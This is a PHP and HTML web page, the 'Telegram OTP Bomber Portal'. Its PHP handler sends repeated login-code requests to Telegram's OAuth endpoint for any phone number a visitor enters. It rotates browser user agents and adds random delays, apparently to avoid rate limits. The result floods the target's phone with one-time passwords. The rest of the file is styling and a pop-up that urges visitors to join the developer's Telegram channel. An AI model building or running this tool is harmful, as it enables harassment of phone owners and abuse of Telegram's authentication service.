<?php
// API Request Handling (GET/POST)
if (isset($_GET['phone']) || isset($_POST['phone'])) {
    $phone  = $_GET['phone'] ?? $_POST['phone'] ?? '';
    $amount = isset($_GET['amount']) ? (int)$_GET['amount'] : 1;

    header('Content-Type: application/json; charset=utf-8');

    if (empty($phone)) {
        echo json_encode([
            'status' => false,
            'error'  => 'Please provide a phone number using ?phone=XXXXXXXX'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }

    $user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36"
    ];

    $results = [];
    for ($i = 0; $i < $amount; $i++) {
        $user_agent = $user_agents[array_rand($user_agents)];
        $url = "https://oauth.telegram.org/auth/request?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&phone=88" . urlencode($phone);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "User-Agent: " . $user_agent,
            "Referer: https://telegram.org"
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            $results[] = "[!] Error: " . $error;
        } else {
            if ($http_code == 200 && strpos($response, "true") !== false) {
                $results[] = "[✔] OTP Sent to +88{$phone} successfully ✅";
            } else {
                $results[] = "[✘] Failed to Send OTP to +88{$phone} ❌";
            }
        }
        usleep(mt_rand(200000, 500000));
    }

    echo json_encode([
        'status'    => true,
        'developer' => 'MehediSanix',
        'channel'   => 'https://t.me/+yP6jdlXJqq4wZGVl',
        'logs'      => $results
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram OTP Bomber Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Poppins', system-ui, -apple-system, sans-serif;
        }

        body {
            background: #030014;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
            padding: 20px;
        }

        /* Real Glass Floating Orb Animations */
        .glass-orb {
            position: absolute;
            border-radius: 50%;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.02));
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: inset 0 0 20px rgba(255, 255, 255, 0.15), 0 15px 35px rgba(0, 0, 0, 0.5);
            animation: floatGlass 15s infinite ease-in-out alternate;
            z-index: 1;
        }

        .orb-1 { width: 250px; height: 250px; top: -5%; left: -5%; border: 1px solid rgba(255, 255, 255, 0.15); animation-duration: 12s; }
        .orb-2 { width: 320px; height: 320px; bottom: -10%; right: -5%; border: 1px solid rgba(255, 255, 255, 0.1); animation-duration: 18s; animation-delay: -5s; }
        .orb-3 { width: 180px; height: 180px; top: 40%; right: 15%; border: 1px solid rgba(255, 255, 255, 0.2); animation-duration: 10s; animation-delay: -2s; }

        @keyframes floatGlass {
            0% { transform: translateY(0px) translateX(0px) rotate(0deg); }
            50% { transform: translateY(-40px) translateX(30px) rotate(180deg); }
            100% { transform: translateY(40px) translateX(-30px) rotate(360deg); }
        }

        /* Glassmorphic Container */
        .container {
            position: relative;
            z-index: 10;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 30px;
            padding: 40px 30px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
            color: #fff;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h2 {
            font-size: 26px;
            font-weight: 700;
            background: linear-gradient(135deg, #ffffff 0%, #a5b4fc 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header p {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.5);
            margin-top: 6px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 13px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.8);
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-wrapper i {
            position: absolute;
            left: 16px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 16px;
        }

        input {
            width: 100%;
            padding: 15px 16px 15px 48px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
        }

        input::placeholder { color: rgba(255, 255, 255, 0.3); }
        input:focus { border-color: #818cf8; background: rgba(255, 255, 255, 0.08); box-shadow: 0 0 20px rgba(129, 140, 248, 0.3); }
        input:focus + i { color: #818cf8; }

        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
            border: none;
            border-radius: 16px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.4);
        }

        button:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(99, 102, 241, 0.6); }

        /* Status Box */
        .status-box {
            margin-top: 20px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 15px;
            display: none;
        }

        .status-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
            font-size: 11px;
            color: rgba(255, 255, 255, 0.5);
            text-transform: uppercase;
        }

        .status-content {
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            color: #34d399;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 140px;
            overflow-y: auto;
        }

        /* Mandatory Join Request Modal */
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(3, 0, 20, 0.85);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .modal-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(25px);
            border-radius: 24px;
            padding: 30px;
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
            color: #fff;
        }

        .modal-card i.tg-icon {
            font-size: 50px;
            color: #38bdf8;
            margin-bottom: 15px;
        }

        .modal-card h3 {
            font-size: 22px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .modal-card p {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .modal-btn {
            display: block;
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
            border: none;
            border-radius: 14px;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            text-decoration: none;
            margin-bottom: 12px;
            box-shadow: 0 8px 20px rgba(14, 165, 233, 0.4);
            transition: 0.3s;
        }

        .modal-btn:hover { transform: translateY(-2px); }

        .modal-close-btn {
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: rgba(255, 255, 255, 0.8);
            box-shadow: none;
        }
        .modal-close-btn:hover { background: rgba(255, 255, 255, 0.1); transform: none; }

        .footer-credit {
            text-align: center;
            margin-top: 20px;
            font-size: 11px;
            color: rgba(255, 255, 255, 0.4);
        }
        .footer-credit span { color: #818cf8; }

        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- Mandatory Telegram Join Request Popup Modal -->
    <div class="modal-overlay" id="joinModal">
        <div class="modal-card">
            <i class="fa-brands fa-telegram tg-icon"></i>
            <h3>Join Telegram Channel</h3>
            <p>আমাদের টেলিগ্রাম চ্যানেলে জয়েন রিকোয়েস্ট (Join Request) পাঠানোর পর নিচের বাটনে ক্লিক করে ওয়েবসাইট ব্যবহার করুন।</p>
            <a href="https://t.me/+yP6jdlXJqq4wZGVl" target="_blank" class="modal-btn" onclick="joinedChannel()"><i class="fa-solid fa-user-plus"></i> Join Channel Request</a>
            <button class="modal-btn modal-close-btn" onclick="closeModal()">I Have Requested / Enter</button>
        </div>
    </div>

    <!-- Floating Glass Orbs Background -->
    <div class="glass-orb orb-1"></div>
    <div class="glass-orb orb-2"></div>
    <div class="glass-orb orb-3"></div>

    <div class="container">
        <div class="header">
            <h2>Telegram OTP Portal</h2>
            <p>Designed by MehediSanix</p>
        </div>

        <form id="otpForm">
            <div class="form-group">
                <label>Phone Number (Without +88)</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-phone"></i>
                    <input type="text" id="phone" placeholder="e.g. 017XXXXXXXX" required>
                </div>
            </div>

            <div class="form-group">
                <label>Request Amount</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-layer-group"></i>
                    <input type="number" id="amount" value="3" min="1" max="10" required>
                </div>
            </div>

            <button type="submit" id="submitBtn">
                <span class="spinner" id="spinner"></span>
                <span id="btnText"><i class="fa-solid fa-paper-plane"></i> Start Bomber</span>
            </button>
        </form>

        <div class="status-box" id="statusBox">
            <div class="status-header">
                <span>Execution Logs</span>
            </div>
            <div class="status-content" id="statusContent"></div>
        </div>

        <div class="footer-credit">
            Developer: <span>MehediSanix</span> &bull; Channel: <a href="https://t.me/+yP6jdlXJqq4wZGVl" target="_blank" style="color:#38bdf8; text-decoration:none;">Join Here</a>
        </div>
    </div>

    <script>
        // Modal Control Functions
        function joinedChannel() {
            // লিংক ওপেন হওয়ার পর ইউজার চাইলে ক্লোজ করতে পারবে বা ব্যাক আসতে পারবে
        }

        function closeModal() {
            document.getElementById('joinModal').style.display = 'none';
        }

        document.getElementById('otpForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const amount = document.getElementById('amount').value;
            
            const submitBtn = document.getElementById('submitBtn');
            const spinner = document.getElementById('spinner');
            const btnText = document.getElementById('btnText');
            const statusBox = document.getElementById('statusBox');
            const statusContent = document.getElementById('statusContent');

            spinner.style.display = 'block';
            btnText.innerHTML = 'Processing...';
            submitBtn.disabled = true;

            fetch(`?phone=${encodeURIComponent(phone)}&amount=${encodeURIComponent(amount)}`)
                .then(response => response.json())
                .then(data => {
                    statusBox.style.display = 'block';
                    if(data.logs && Array.isArray(data.logs)) {
                        statusContent.innerText = data.logs.join('\n');
                    } else {
                        statusContent.innerText = JSON.stringify(data, null, 2);
                    }
                })
                .catch(error => {
                    statusBox.style.display = 'block';
                    statusContent.innerText = 'Connection Error: ' + error;
                })
                .finally(() => {
                    spinner.style.display = 'none';
                    btnText.innerHTML = '<i class="fa-solid fa-paper-plane"></i> Start Bomber';
                    submitBtn.disabled = false;
                });
        });
    </script>
</body>
</html>
